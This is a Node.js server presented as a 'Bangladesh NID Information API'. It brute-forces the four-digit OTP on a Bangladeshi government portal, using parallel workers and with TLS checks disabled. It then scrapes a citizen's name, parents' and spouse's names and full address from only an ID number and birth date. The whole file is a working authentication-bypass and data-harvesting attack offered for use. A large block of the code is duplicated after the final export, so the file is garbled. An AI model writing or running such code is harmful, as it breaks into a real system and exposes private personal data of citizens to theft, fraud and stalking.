const express = require('express');
const axios = require('axios');
const https = require('https');
const { JSDOM } = require('jsdom');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// ==================== CONFIG ====================
const PARALLEL_WORKERS = 5;
const BATCH_SIZE_PER_WORKER = 50;
const MOBILE_PREFIX = "016";
const TARGET_LOCATION = "movementContractor/form";

// Create axios instance with better configuration
const axiosInstance = axios.create({
    httpsAgent: new https.Agent({
        rejectUnauthorized: false,
        keepAlive: true,
        maxSockets: 50
    }),
    timeout: 10000,
    maxRedirects: 0
});

// Middleware
app.use(cors());
app.use(express.json());

// Utility functions
function generateMobile() {
    return MOBILE_PREFIX + Math.random().toString().slice(2, 10);
}

function generatePassword() {
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const alphanumeric = 'abcdefghijklmnopqrstuvwxyz0123456789';
    return '#' + uppercase[Math.floor(Math.random() * uppercase.length)] + 
           Array.from({length: 8}, () => alphanumeric[Math.floor(Math.random() * alphanumeric.length)]).join('');
}

function generateOTPRange() {
    const range = [];
    for (let i = 0; i < 10000; i++) {
        range.push(i.toString().padStart(4, '0'));
    }
    return range;
}

// Improved chunking function
function chunkArray(array, chunkSize) {
    const chunks = [];
    for (let i = 0; i < array.length; i += chunkSize) {
        chunks.push(array.slice(i, i + chunkSize));
    }
    return chunks;
}

// Step 1: Bypass initial verification
async function getCookie(nid, dob, mobile, password) {
    console.log('Step 1: Bypassing initial verification...');
    
    const url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor";
    
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://fsmms.dgf.gov.bd',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    };

    const formData = new URLSearchParams({
        "nidNumber": nid,
        "email": "",
        "mobileNo": mobile,
        "dateOfBirth": dob,
        "password": password,
        "confirm_password": password,
        "next1": ""
    });

    try {
        const response = await axiosInstance.post(url, formData, {
            headers: headers,
            validateStatus: null
        });

        if (response.status === 302) {
            const location = response.headers.location || '';
            if (location.includes('mov-verification')) {
                const cookies = response.headers['set-cookie'];
                if (cookies && cookies.length > 0) {
                    const cookieString = cookies.map(cookie => cookie.split(';')[0]).join('; ');
                    console.log('✓ Initial bypass successful');
                    return cookieString;
                }
            }
        }
        
        throw new Error('Bypass failed - No redirect to verification page');
    } catch (error) {
        console.error('Bypass error:', error.message);
        throw new Error(`Bypass failed: ${error.message}`);
    }
}

// Step 2: Try single OTP
async function tryOTP(cookie, otp) {
    const url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step";
    
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookie,
        'Origin': 'https://fsmms.dgf.gov.bd',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1'
    };

    const formData = new URLSearchParams({
        "otpDigit1": otp[0],
        "otpDigit2": otp[1],
        "otpDigit3": otp[2],
        "otpDigit4": otp[3]
    });

    try {
        const response = await axiosInstance.post(url, formData, {
            headers: headers,
            validateStatus: null
        });

        if (response.status === 302) {
            const location = response.headers.location || '';
            if (location.includes(TARGET_LOCATION)) {
                return otp;
            }
        }
        return null;
    } catch (error) {
        return null;
    }
}

// IMPROVED parallel processing with better error handling
async function tryBatchParallel(cookie, otpBatch, workerId) {
    console.log(`Worker ${workerId} started with ${otpBatch.length} OTPs`);

    for (let i = 0; i < otpBatch.length; i++) {
        try {
            const result = await tryOTP(cookie, otpBatch[i]);
            if (result) {
                console.log(`Worker ${workerId} found OTP: ${result}`);
                return result;
            }

            // প্রতি ১০টি attempt এ একবার delay
            if (i % 10 === 0) {
                await new Promise(resolve => setTimeout(resolve, 50));
            }
        } catch (error) {
            console.error(`Worker ${workerId} error at OTP ${otpBatch[i]}:`, error.message);
        }
    }

    console.log(`Worker ${workerId} completed without finding OTP`);
    return null;
}

// IMPROVED main brute force function
async function bruteForceOTPParallel(cookie, otpRange, workers = PARALLEL_WORKERS) {
    // Shuffle OTP range
    const shuffledOTPs = [...otpRange].sort(() => Math.random() - 0.5);

    // Split into chunks for workers
    const chunkSize = Math.ceil(shuffledOTPs.length / workers);
    const chunks = chunkArray(shuffledOTPs, chunkSize);

    console.log(`Starting parallel brute force with ${workers} workers...`);
    console.log(`Each worker handling ~${chunks[0].length} OTPs`);

    // Create workers with delay to avoid overwhelming the server
    const workerPromises = chunks.map((chunk, index) =>
        new Promise(resolve => {
            // Stagger worker start times
            setTimeout(async() => {
                const result = await tryBatchParallel(cookie, chunk, index + 1);
                resolve(result);
            }, index * 500); // 500ms delay between worker starts
        })
    );

    // Use Promise.race to get the first successful result
    return new Promise((resolve) => {
        let completedWorkers = 0;

        workerPromises.forEach(promise => {
            promise.then(result => {
                completedWorkers++;

                if (result) {
                    console.log(`OTP found by worker, completing...`);
                    // Cancel other workers by resolving immediately
                    resolve(result);
                } else if (completedWorkers === workers) {
                    // All workers completed without finding OTP
                    console.log('All workers completed, OTP not found');
                    resolve(null);
                }
            });
        });
    });
}

// Step 3: Fetch form data
async function fetchFormData(cookie) {
    console.log('Step 4: Fetching form data...');
    
    const url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";
    
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': cookie,
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin'
    };

    try {
        const response = await axiosInstance.get(url, { headers });
        return response.data;
    } catch (error) {
        throw new Error(`Failed to fetch form data: ${error.message}`);
    }
}

// Step 4: Extract data from HTML using JSDOM
function extractFormData(html) {
    console.log('Step 5: Extracting form data...');
    
    const dom = new JSDOM(html);
    const document = dom.window.document;
    
    const fields = [
        'contractorName', 'fatherName', 'motherName', 'spouseName',
        'nidPerDivision', 'nidPerDistrict', 'nidPerUpazila', 'nidPerUnion',
        'nidPerVillage', 'nidPerWard', 'nidPerZipCode', 'nidPerPostOffice',
        'nidPerHolding', 'nidPerMouza', 'nationality'
    ];
    
    const extracted = {};
    
    fields.forEach(field => {
        const input = document.querySelector(`[name="${field}"], #${field}`);
        if (input) {
            extracted[field] = input.value || '';
        } else {
            extracted[field] = '';
        }
    });
    
    return extracted;
}

// Step 5: Enrich and format data
function enrichData(extractedData, nid, dob) {
    console.log('Step 6: Enriching data...');
    
    const {
        contractorName,
        fatherName,
        motherName,
        spouseName,
        nidPerDivision,
        nidPerDistrict,
        nidPerUpazila,
        nidPerUnion,
        nidPerVillage,
        nidPerWard,
        nidPerZipCode,
        nidPerPostOffice,
        nidPerHolding,
        nidPerMouza,
        nationality
    } = extractedData;

    // Build address
    const addressParts = [];
    if (nidPerHolding) addressParts.push(`বাসা/হোল্ডিং: ${nidPerHolding}`);
    if (nidPerVillage) addressParts.push(`গ্রাম: ${nidPerVillage}`);
    if (nidPerMouza) addressParts.push(`মৌজা: ${nidPerMouza}`);
    if (nidPerUnion) addressParts.push(`ইউনিয়ন: ${nidPerUnion}`);
    if (nidPerWard) addressParts.push(`ওয়ার্ড: ${nidPerWard}`);
    if (nidPerPostOffice) addressParts.push(`ডাকঘর: ${nidPerPostOffice}`);
    if (nidPerZipCode) addressParts.push(`জিপ কোড: ${nidPerZipCode}`);
    if (nidPerUpazila) addressParts.push(`উপজেলা: ${nidPerUpazila}`);
    if (nidPerDistrict) addressParts.push(`জেলা: ${nidPerDistrict}`);
    if (nidPerDivision) addressParts.push(`বিভাগ: ${nidPerDivision}`);

    const address = addressParts.join(', ');

    const finalData = {
        nameBangla: contractorName || '',
        nameEnglish: '',
        nationalId: nid,
        dateOfBirth: dob,
        fatherName: fatherName || '',
        motherName: motherName || '',
        spouseName: spouseName || '',
        nationality: nationality || 'Bangladeshi',
        permanentAddress: address,
        presentAddress: address,
        division: nidPerDivision || '',
        district: nidPerDistrict || '',
        upazila: nidPerUpazila || '',
        union: nidPerUnion || '',
        village: nidPerVillage || '',
        ward: nidPerWard || '',
        postOffice: nidPerPostOffice || '',
        zipCode: nidPerZipCode || '',
        extractedRaw: extractedData
    };

    return finalData;
}

// API Routes
app.get('/', (req, res) => {
    res.json({
        message: 'Bangladesh NID Information API is running',
        status: 'active',
        version: '1.0.0',
        endpoints: {
            getInfo: 'GET /get-info?nid=YOUR_NID&dob=YYYY-MM-DD',
            health: 'GET /health'
        },
        example: {
            url: 'http://localhost:3000/get-info?nid=1234567890&dob=1990-01-01'
        }
    });
});

app.get('/get-info', async (req, res) => {
    try {
        const { nid, dob } = req.query;

        if (!nid || !dob) {
            return res.status(400).json({ 
                error: 'NID and DOB are required',
                example: '/get-info?nid=1234567890&dob=1990-01-01'
            });
        }

        console.log(`\n🔍 Processing request for NID: ${nid}, DOB: ${dob}`);

        // Generate random credentials
        const mobile = generateMobile();
        const password = generatePassword();
        
        console.log(`📱 Generated Mobile: ${mobile}`);
        console.log(`🔑 Generated Password: ${password}`);

        // 1. Get cookie/session
        console.log('🔄 Step 1: Getting session cookie...');
        const cookie = await getCookie(nid, dob, mobile, password);

        // 2. Generate OTP range
        console.log('🔄 Step 2: Generating OTP range...');
        const otpRange = generateOTPRange();

        // 3. Try OTPs in parallel
        console.log('🔄 Step 3: Trying OTPs in parallel...');
        const foundOTP = await bruteForceOTPParallel(cookie, otpRange, PARALLEL_WORKERS);

        if (foundOTP) {
            console.log(`✅ OTP found: ${foundOTP}`);

            // 4. Fetch form data
            console.log('🔄 Step 4: Fetching form data...');
            const html = await fetchFormData(cookie);

            // 5. Extract and enrich data
            console.log('🔄 Step 5: Extracting and processing data...');
            const extractedData = extractFormData(html);
            const finalData = enrichData(extractedData, nid, dob);

            console.log('✅ Success: Data retrieved successfully');
            
            res.json({
                success: true,
                message: 'Data retrieved successfully',
                data: finalData,
                meta: {
                    nid: nid,
                    dob: dob,
                    otpUsed: foundOTP,
                    timestamp: new Date().toISOString()
                }
            });

        } else {
            console.log('❌ Error: OTP not found');
            res.status(404).json({ 
                success: false,
                error: "OTP not found after all attempts",
                message: "Please try again later"
            });
        }

    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ 
            success: false,
            error: error.message,
            message: "Internal server error"
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        service: 'Bangladesh NID API',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        config: {
            parallelWorkers: PARALLEL_WORKERS,
            batchSize: BATCH_SIZE_PER_WORKER,
            mobilePrefix: MOBILE_PREFIX
        }
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('🚨 Unhandled Error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal Server Error',
        message: 'Something went wrong!'
    });
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: 'Endpoint not found',
        message: 'Check the API documentation at GET /'
    });
});

// Start server
app.listen(PORT, () => {
    console.log('\n' + '='.repeat(50));
    console.log('🚀 Bangladesh NID Info API Server Started');
    console.log('='.repeat(50));
    console.log(`📍 Port: ${PORT}`);
    console.log(`🌐 URL: http://localhost:${PORT}`);
    console.log(`⚡ Parallel workers: ${PARALLEL_WORKERS}`);
    console.log(`📱 Mobile prefix: ${MOBILE_PREFIX}`);
    console.log('='.repeat(50));
    console.log('\n📚 Available Endpoints:');
    console.log(`   GET  /              - API Documentation`);
    console.log(`   GET  /health        - Health Check`);
    console.log(`   GET  /get-info      - Get NID Information`);
    console.log('='.repeat(50) + '\n');
});

module.exports = app;        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookie,
        'Origin': 'https://fsmms.dgf.gov.bd',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1'
    };

    const formData = new URLSearchParams({
        "otpDigit1": otp[0],
        "otpDigit2": otp[1],
        "otpDigit3": otp[2],
        "otpDigit4": otp[3]
    });

    try {
        const response = await axiosInstance.post(url, formData, {
            headers: headers,
            validateStatus: null
        });

        if (response.status === 302) {
            const location = response.headers.location || '';
            if (location.includes(TARGET_LOCATION)) {
                return otp;
            }
        }
        return null;
    } catch (error) {
        return null;
    }
}

// IMPROVED parallel processing with better error handling
async function tryBatchParallel(cookie, otpBatch, workerId) {
    console.log(`Worker ${workerId} started with ${otpBatch.length} OTPs`);

    for (let i = 0; i < otpBatch.length; i++) {
        try {
            const result = await tryOTP(cookie, otpBatch[i]);
            if (result) {
                console.log(`Worker ${workerId} found OTP: ${result}`);
                return result;
            }

            // প্রতি ১০টি attempt এ একবার delay
            if (i % 10 === 0) {
                await new Promise(resolve => setTimeout(resolve, 50));
            }
        } catch (error) {
            console.error(`Worker ${workerId} error at OTP ${otpBatch[i]}:`, error.message);
        }
    }

    console.log(`Worker ${workerId} completed without finding OTP`);
    return null;
}

// IMPROVED main brute force function
async function bruteForceOTPParallel(cookie, otpRange, workers = PARALLEL_WORKERS) {
    // Shuffle OTP range
    const shuffledOTPs = [...otpRange].sort(() => Math.random() - 0.5);

    // Split into chunks for workers
    const chunkSize = Math.ceil(shuffledOTPs.length / workers);
    const chunks = chunkArray(shuffledOTPs, chunkSize);

    console.log(`Starting parallel brute force with ${workers} workers...`);
    console.log(`Each worker handling ~${chunks[0].length} OTPs`);

    // Create workers with delay to avoid overwhelming the server
    const workerPromises = chunks.map((chunk, index) =>
        new Promise(resolve => {
            // Stagger worker start times
            setTimeout(async() => {
                const result = await tryBatchParallel(cookie, chunk, index + 1);
                resolve(result);
            }, index * 500); // 500ms delay between worker starts
        })
    );

    // Use Promise.race to get the first successful result
    return new Promise((resolve) => {
        let completedWorkers = 0;

        workerPromises.forEach(promise => {
            promise.then(result => {
                completedWorkers++;

                if (result) {
                    console.log(`OTP found by worker, completing...`);
                    // Cancel other workers by resolving immediately
                    resolve(result);
                } else if (completedWorkers === workers) {
                    // All workers completed without finding OTP
                    console.log('All workers completed, OTP not found');
                    resolve(null);
                }
            });
        });
    });
}

// Step 3: Fetch form data
async function fetchFormData(cookie) {
    console.log('Step 4: Fetching form data...');
    
    const url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";
    
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': cookie,
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin'
    };

    try {
        const response = await axiosInstance.get(url, { headers });
        return response.data;
    } catch (error) {
        throw new Error(`Failed to fetch form data: ${error.message}`);
    }
}

// Step 4: Extract data from HTML using JSDOM
function extractFormData(html) {
    console.log('Step 5: Extracting form data...');
    
    const dom = new JSDOM(html);
    const document = dom.window.document;
    
    const fields = [
        'contractorName', 'fatherName', 'motherName', 'spouseName',
        'nidPerDivision', 'nidPerDistrict', 'nidPerUpazila', 'nidPerUnion',
        'nidPerVillage', 'nidPerWard', 'nidPerZipCode', 'nidPerPostOffice',
        'nidPerHolding', 'nidPerMouza', 'nationality'
    ];
    
    const extracted = {};
    
    fields.forEach(field => {
        const input = document.querySelector(`[name="${field}"], #${field}`);
        if (input) {
            extracted[field] = input.value || '';
        } else {
            extracted[field] = '';
        }
    });
    
    return extracted;
}

// Step 5: Enrich and format data
function enrichData(extractedData, nid, dob) {
    console.log('Step 6: Enriching data...');
    
    const {
        contractorName,
        fatherName,
        motherName,
        spouseName,
        nidPerDivision,
        nidPerDistrict,
        nidPerUpazila,
        nidPerUnion,
        nidPerVillage,
        nidPerWard,
        nidPerZipCode,
        nidPerPostOffice,
        nidPerHolding,
        nidPerMouza,
        nationality
    } = extractedData;

    // Build address
    const addressParts = [];
    if (nidPerHolding) addressParts.push(`বাসা/হোল্ডিং: ${nidPerHolding}`);
    if (nidPerVillage) addressParts.push(`গ্রাম: ${nidPerVillage}`);
    if (nidPerMouza) addressParts.push(`মৌজা: ${nidPerMouza}`);
    if (nidPerUnion) addressParts.push(`ইউনিয়ন: ${nidPerUnion}`);
    if (nidPerWard) addressParts.push(`ওয়ার্ড: ${nidPerWard}`);
    if (nidPerPostOffice) addressParts.push(`ডাকঘর: ${nidPerPostOffice}`);
    if (nidPerZipCode) addressParts.push(`জিপ কোড: ${nidPerZipCode}`);
    if (nidPerUpazila) addressParts.push(`উপজেলা: ${nidPerUpazila}`);
    if (nidPerDistrict) addressParts.push(`জেলা: ${nidPerDistrict}`);
    if (nidPerDivision) addressParts.push(`বিভাগ: ${nidPerDivision}`);

    const address = addressParts.join(', ');

    const finalData = {
        nameBangla: contractorName || '',
        nameEnglish: '',
        nationalId: nid,
        dateOfBirth: dob,
        fatherName: fatherName || '',
        motherName: motherName || '',
        spouseName: spouseName || '',
        nationality: nationality || 'Bangladeshi',
        permanentAddress: address,
        presentAddress: address,
        division: nidPerDivision || '',
        district: nidPerDistrict || '',
        upazila: nidPerUpazila || '',
        union: nidPerUnion || '',
        village: nidPerVillage || '',
        ward: nidPerWard || '',
        postOffice: nidPerPostOffice || '',
        zipCode: nidPerZipCode || '',
        extractedRaw: extractedData
    };

    return finalData;
}

// API Routes
app.get('/', (req, res) => {
    res.json({
        message: 'Bangladesh NID Information API is running',
        status: 'active',
        version: '1.0.0',
        endpoints: {
            getInfo: 'GET /get-info?nid=YOUR_NID&dob=YYYY-MM-DD',
            health: 'GET /health'
        },
        example: {
            url: 'http://localhost:3000/get-info?nid=1234567890&dob=1990-01-01'
        }
    });
});

app.get('/get-info', async (req, res) => {
    try {
        const { nid, dob } = req.query;

        if (!nid || !dob) {
            return res.status(400).json({ 
                error: 'NID and DOB are required',
                example: '/get-info?nid=1234567890&dob=1990-01-01'
            });
        }

        console.log(`\n🔍 Processing request for NID: ${nid}, DOB: ${dob}`);

        // Generate random credentials
        const mobile = generateMobile();
        const password = generatePassword();
        
        console.log(`📱 Generated Mobile: ${mobile}`);
        console.log(`🔑 Generated Password: ${password}`);

        // 1. Get cookie/session
        console.log('🔄 Step 1: Getting session cookie...');
        const cookie = await getCookie(nid, dob, mobile, password);

        // 2. Generate OTP range
        console.log('🔄 Step 2: Generating OTP range...');
        const otpRange = generateOTPRange();

        // 3. Try OTPs in parallel
        console.log('🔄 Step 3: Trying OTPs in parallel...');
        const foundOTP = await bruteForceOTPParallel(cookie, otpRange, PARALLEL_WORKERS);

        if (foundOTP) {
            console.log(`✅ OTP found: ${foundOTP}`);

            // 4. Fetch form data
            console.log('🔄 Step 4: Fetching form data...');
            const html = await fetchFormData(cookie);

            // 5. Extract and enrich data
            console.log('🔄 Step 5: Extracting and processing data...');
            const extractedData = extractFormData(html);
            const finalData = enrichData(extractedData, nid, dob);

            console.log('✅ Success: Data retrieved successfully');
            
            res.json({
                success: true,
                message: 'Data retrieved successfully',
                data: finalData,
                meta: {
                    nid: nid,
                    dob: dob,
                    otpUsed: foundOTP,
                    timestamp: new Date().toISOString()
                }
            });

        } else {
            console.log('❌ Error: OTP not found');
            res.status(404).json({ 
                success: false,
                error: "OTP not found after all attempts",
                message: "Please try again later"
            });
        }

    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ 
            success: false,
            error: error.message,
            message: "Internal server error"
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        service: 'Bangladesh NID API',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        config: {
            parallelWorkers: PARALLEL_WORKERS,
            batchSize: BATCH_SIZE_PER_WORKER,
            mobilePrefix: MOBILE_PREFIX
        }
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('🚨 Unhandled Error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal Server Error',
        message: 'Something went wrong!'
    });
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: 'Endpoint not found',
        message: 'Check the API documentation at GET /'
    });
});

// Start server
app.listen(PORT, () => {
    console.log('\n' + '='.repeat(50));
    console.log('🚀 Bangladesh NID Info API Server Started');
    console.log('='.repeat(50));
    console.log(`📍 Port: ${PORT}`);
    console.log(`🌐 URL: http://localhost:${PORT}`);
    console.log(`⚡ Parallel workers: ${PARALLEL_WORKERS}`);
    console.log(`📱 Mobile prefix: ${MOBILE_PREFIX}`);
    console.log('='.repeat(50));
    console.log('\n📚 Available Endpoints:');
    console.log(`   GET  /              - API Documentation`);
    console.log(`   GET  /health        - Health Check`);
    console.log(`   GET  /get-info      - Get NID Information`);
    console.log('='.repeat(50) + '\n');
});

module.exports = app;
